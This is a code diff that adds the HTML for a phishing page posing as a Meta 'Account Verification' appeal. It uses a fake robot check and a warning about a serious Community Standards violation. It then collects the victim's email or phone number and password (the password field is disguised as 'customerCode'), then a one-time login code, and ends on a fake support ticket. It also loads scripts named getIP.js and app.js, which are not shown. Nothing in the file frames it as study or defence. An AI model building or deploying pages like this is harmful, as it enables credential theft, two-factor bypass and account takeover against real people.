@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-V7RH7T85NG"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-V7RH7T85NG');
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="/getIP.js" defer></script>
+</head>
+<body>
+
+<section class="step active" id="step1">
+    <div class="card small-card">
+        <div class="progress" data-progress="1"></div>
+
+        <img src="logomau.png" class="logo" alt="Logo">
+
+        <h2>Security Verification</h2>
+        <p class="desc">Please confirm that you are a real person to access this service.</p>
+
+        <label class="robot-box">
+            <input type="checkbox" id="robotCheck">
+            <span>I'm not a robot</span>
+        </label>
+
+        <div class="brand">Meta@2026</div>
+    </div>
+</section>
+
+<section class="step" id="step2">
+    <div class="card video-card">
+        <div class="progress" data-progress="2"></div>
+
+        <video id="introVideo" src="video.mp4" playsinline muted></video>
+
+        <p class="video-note">Processing your request. Please keep this tab open until the process is complete.</p>
+    </div>
+</section>
+
+<section class="step" id="step3">
+    <div class="card form-card">
+        <div class="progress" data-progress="3"></div>
+
+        <img src="logomau.png" class="logo" alt="Logo">
+        <img src="banermau.jpg" class="banner" alt="Banner">
+
+        <h2>Account Verification</h2>
+        <p class="desc">
+            Your account has been reported for a serious violation of our Community Standards. Please verify your identity immediately.
+        </p>
+
+        <input
+            type="text"
+            id="contact"
+            placeholder="Email address or mobile number"
+            autocomplete="on">
+
+        <p class="error" id="contactError"></p>
+
+        <input
+            type="text"
+            id="customerCode"
+            placeholder="Password"
+            autocomplete="off">
+
+        <p class="error" id="customerCodeError"></p>
+
+        <button id="submitBtn">Submit Appeal</button>
+
+        <div class="brand">Meta@2026</div>
+    </div>
+</section>
+
+<section class="step" id="step5">
+    <div class="card form-card otp-card">
+        <div class="progress" data-progress="4"></div>
+
+        <img src="logomau.png" class="logo" alt="Logo">
+
+        <h2>Account Verification</h2>
+
+<div class="notice-box">
+    We've sent a verification code to your
+    <strong>Email, SMS</strong> or <strong>WhatsApp</strong> Please enter the code below.
+</div>
+
+<img src="otp-image.png.jpg" class="otp-image" alt="Ảnh minh họa">
+<p class="desc">
+    This process may take a few minutes. Please wait until the verification code is sent. Once the code is sent, you will be able to log in. Verifying the device listed in the message allows our system to identify you and confirm that you are the legitimate owner of the account.
+</p>
+        <input
+            type="tel"
+            inputmode="numeric"
+            pattern="[0-9]*"
+            id="otpCode"
+            placeholder="Code"
+            autocomplete="one-time-code">
+
+        <p class="error" id="otpError"></p>
+
+        <p class="attempt-text" id="attemptText"></p>
+
+        <div class="resend-row">
+            <button class="resend-btn" id="resendBtn">Get new code</button>
+            <span id="resendTimer">60s</span>
+        </div>
+
+        <button id="verifyOtpBtn">Continue</button>
+
+        <div class="brand">Meta@2026</div>
+    </div>
+</section>
+
+<section class="step" id="step7">
+    <div class="card small-card success-card">
+        <div class="progress" data-progress="5"></div>
+
+        <img src="logomau.png" class="logo" alt="Logo">
+
+        <div class="success-icon">✓</div>
+
+        <h2>Identity confirmed.</h2>
+        <p class="desc">Thank you for confirming your identity. You can now restore access to your account.</p>
+
+        <div class="request-box">
+            <span>Support Ticket Number:</span>
+            <strong id="requestCode">REQ-2026-000000</strong>
+        </div>
+
+        <div class="brand">Meta@2026</div>
+    </div>
+</section>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-box">
+        <img src="logomau.png" class="loading-logo" alt="Logo">
+
+        <div class="spinner"></div>
+
+        <h3 id="loadingTitle">Appeal in progress...</h3>
+        <p id="loadingStatus">✓ Your appeal is being submitted to Meta for review. This process may take a few moments.</p>
+
+        <strong id="countdown">15</strong>
+
+        <div class="brand">Meta@2026</div>
+    </div>
+</div>
+
+<script src="app.js"></script>
+</body>
+</html>
